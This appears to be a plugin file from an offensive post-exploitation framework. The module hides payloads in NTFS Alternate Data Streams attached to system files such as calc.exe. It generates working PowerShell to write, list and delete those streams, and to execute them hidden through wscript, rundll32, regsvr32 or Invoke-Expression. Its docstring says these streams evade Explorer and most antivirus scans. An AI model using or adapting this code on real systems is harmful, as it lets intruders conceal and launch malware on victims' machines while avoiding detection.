"""
persistence/ads_hide — NTFS Alternate Data Stream (ADS) stealth storage. MITRE T1564.004.
Stores payloads, scripts, or arbitrary data inside hidden ADS attached to
legitimate files (e.g. C:\\Windows\\System32\\calc.exe:hidden_data).
ADS are invisible to Explorer and most AV scans; survive normal file operations.
Also supports ADS-based execution via wscript/rundll32/regsvr32.
"""
from __future__ import annotations

import base64
from pathlib import Path

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class AdsHide(BasePlugin):
    NAME        = "ads_hide"
    DESCRIPTION = "Store/execute payloads in NTFS Alternate Data Streams (T1564.004)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1564.004"
    CATEGORY    = "persistence"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="write",
              help="write | read | exec | list | delete"),
        Param("host_file", str, required=False, default=r"C:\Windows\System32\calc.exe",
              help="NTFS file to attach the ADS to (must exist)"),
        Param("stream_name", str, required=False, default="data",
              help="ADS stream name (becomes host_file:stream_name)"),
        Param("content_b64", str, required=False, default="",
              help="[write] Base64 content to store in the stream"),
        Param("content_path", str, required=False, default="",
              help="[write] Local file path on operator machine to store in the stream"),
        Param("exec_method", str, required=False, default="wscript",
              help="[exec] wscript | rundll32 | regsvr32 | powershell"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action       = params.get("action", "write").lower()
        host_file    = params.get("host_file", r"C:\Windows\System32\calc.exe")
        stream_name  = params.get("stream_name", "data")
        content_b64  = params.get("content_b64", "")
        content_path = params.get("content_path", "")
        exec_method  = params.get("exec_method", "wscript").lower()

        if action == "write":
            if content_path:
                p = Path(content_path)
                if not p.exists():
                    return ModuleResult.err(f"content_path not found: {content_path}")
                content_b64 = base64.b64encode(p.read_bytes()).decode()
            if not content_b64:
                return ModuleResult.err("content_b64 or content_path required for write")

        ads_path = f"{host_file}:{stream_name}"

        if action == "write":
            ps = self._ps_write(ads_path, content_b64)
        elif action == "read":
            ps = self._ps_read(ads_path)
        elif action == "exec":
            ps = self._ps_exec(ads_path, exec_method)
        elif action == "list":
            ps = self._ps_list(host_file)
        elif action == "delete":
            ps = self._ps_delete(ads_path)
        else:
            return ModuleResult.err("action must be: write | read | exec | list | delete")

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"ads_hide failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="ads_hide")

    @staticmethod
    def _ps_write(ads_path: str, content_b64: str) -> str:
        return f"""
$adsPath = '{ads_path}'
$bytes   = [Convert]::FromBase64String('{content_b64}')
try {{
    $fs = [System.IO.File]::Open($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
    $fs.Write($bytes, 0, $bytes.Length)
    $fs.Close()
    "[+] Written $($bytes.Length) bytes to ADS: $adsPath"
}} catch {{ "[-] $_" }}
""".strip()

    @staticmethod
    def _ps_read(ads_path: str) -> str:
        return f"""
$adsPath = '{ads_path}'
try {{
    $bytes = [System.IO.File]::ReadAllBytes($adsPath)
    $b64   = [Convert]::ToBase64String($bytes)
    $text  = [System.Text.Encoding]::UTF8.GetString($bytes) -replace '[^\x20-\x7E\r\n]','.'
    "[+] ADS {ads_path} ($($bytes.Length) bytes)`n" + $text.Substring(0, [Math]::Min($text.Length, 2000))
}} catch {{ "[-] $_" }}
""".strip()

    @staticmethod
    def _ps_exec(ads_path: str, method: str) -> str:
        exec_map = {
            "wscript":    f"Start-Process wscript.exe -ArgumentList '{ads_path}' -WindowStyle Hidden",
            "rundll32":   f"Start-Process rundll32.exe -ArgumentList '{ads_path},EntryPoint' -WindowStyle Hidden",
            "regsvr32":   f"Start-Process regsvr32.exe -ArgumentList '/s /n /u /i:{ads_path} scrobj.dll' -WindowStyle Hidden",
            "powershell": f"$ps1 = [System.IO.File]::ReadAllText('{ads_path}'); Invoke-Expression $ps1",
        }
        cmd = exec_map.get(method, exec_map["wscript"])
        return f"""
$results = @("[*] Executing ADS via {method}: {ads_path}")
try {{
    {cmd}
    $results += "[+] Execution initiated"
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_list(host_file: str) -> str:
        return f"""
$results = @("[*] ADS streams on: {host_file}")
try {{
    $streams = Get-Item '{host_file}' -Stream * -ErrorAction Stop
    foreach ($s in $streams) {{
        if ($s.Stream -ne ':$DATA') {{
            $results += "  $($s.FileName):$($s.Stream)  ($($s.Length) bytes)"
        }}
    }}
    if ($results.Count -eq 1) {{ $results += "  (no ADS found)" }}
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_delete(ads_path: str) -> str:
        return f"""
try {{
    Remove-Item '{ads_path}' -Force
    "[+] Deleted ADS: {ads_path}"
}} catch {{ "[-] $_" }}
""".strip()
